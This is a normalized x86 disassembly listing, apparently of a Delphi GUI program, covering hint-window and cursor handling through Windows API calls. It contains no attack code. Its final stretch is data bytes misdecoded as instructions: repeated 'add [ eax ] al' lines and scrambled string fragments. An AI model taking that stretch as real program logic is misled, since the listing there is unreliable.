call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_45e5ac
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43c6a4
mov edi eax
call sub_43afa0
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_43efc4
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_43efc4
sub_45e624
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e734
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45e5ac
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45c65c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43af08
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_45e7e4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_45e6db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45eb7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45e548
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_419a60
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e73b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45e744
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45bad8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45bac4
movzx edx di
xor ecx ecx
call sub_43efc4
inc esi
dec ebx
jne r-xdata
sub_45e780
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45d89c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45d89c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45e744
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45e7e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404480
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_4040c8
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4376c8
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a8f8
xor eax eax
push ebp
push sub_45e869
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40349c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45e878
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45e8d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45bad8
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45e878
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bac4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45e878
pop ecx
jmp r-xdata
mov eax ebx
call sub_4448fc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call IsChild
test eax eax
jne r-xdata
sub_45e95c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4056e0
call sub_4256a4
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45e984
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45e9c8
push sub_45c6b4
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45eb7c
sub_45e9f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b0c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43d910
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43c6a4
call sub_45c694
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45eb7c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406b0c
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43d910
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45eb7c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45e984
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43efc4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45ee14
jmp r-xdata
sub_45eb00
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45e9c8
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45ee14
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45eb38
jmp r-xdata
sub_45eb38
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4445f8
push eax
call ShowWindow
sub_45eb7c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45eb38
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45c81c
mov eax ebx
call sub_45e9c8
sub_45ebb4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45ecf6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41f784
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407c78
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45ecc7
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41f83c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ecce
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45eba4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45eba4
mov [ ebp - 0x4 ] eax
sub_45ecce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45ed08
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4032a0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031e8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45ed68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45ee02
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee09
lea eax [ ebp - 0x8 ]
call sub_404074
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404164
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41e320
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c220
mov ebx eax
inc ebx
sub_45ee14
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049e0
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45f19a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45eb7c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45e984
jmp r-xdata
call sub_455044
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f1a1
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404ab0
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43c6a4
call sub_45c694
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45ebb4
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45ba58
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d798
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d93c
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45c65c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43aec4
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_40410c
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43efc4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45ed08
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d910
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d910
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43df98
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45c7a8
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45ed68
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45e984
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45e984
jmp r-xdata
sub_45f1a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_4040c8
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_4040c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45f1e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43efc4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43efc4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44a7c0
sub_45f274
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45f29c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45f340
add [ eax ] eax
add [ eax ] al
jo r-xdata
jns r-xdata
dec eax
add ah bl
mov eax [ 0x43 ]
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f3a3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
ror [ ebx + 0x48 ] 0x0
mov eax sub_455070
call sub_4138d8
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f3aa
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_454df0
mov eax sub_455070
call sub_413918
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45f3de
add [ eax ] al
push esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045f4 ] bl
add [ eax ] al
add al dh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
bound esp [ ecx + 0x72 ]
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
cmc
inc ebp
add [ eax + eax ] cl
add [ eax ] al
imul ebp [ edi + 0x6e ] 0x45f4f890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
hlt
add [ fs : eax ] al
cmp al 0xf4
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 8 ] bh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al [ ebp + 0x49 ]
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
inc eax
inc eax
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or al 0x45
dec ecx
inc ebp
js r-xdata
jo r-xdata
jo r-xdata
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
imul ebp [ edi + 0x6e ] 0x9800408d
hlt
sub_45f539
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax [ ebp + 0x49 ]
inc ecx
insb
jb r-xdata
imul esp [ ebp + 0x74 ] 0x18
popad
jns r-xdata
imul ebp [ ebp + 0x65 ] 0x9074756f
je r-xdata
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 8 + 0x45 ] dh
add [ eax + eax ] cl
add [ eax ] al
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
inc ebx
insb
outsd
jae r-xdata
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
mov esp 0x45f5
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 8 + 0xc0045 ] bh
add [ eax ] al
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
test [ ebp ] 0xc
add [ eax ] al
add al dh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
push cs
inc ebp
dec ecx
push edx
popad
push esp
test [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_45f849
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
or eax 0x53644945
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xf9
outsd
jb r-xdata
nop
jae r-xdata
inc eax
add [ eax + 0x13004032 ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
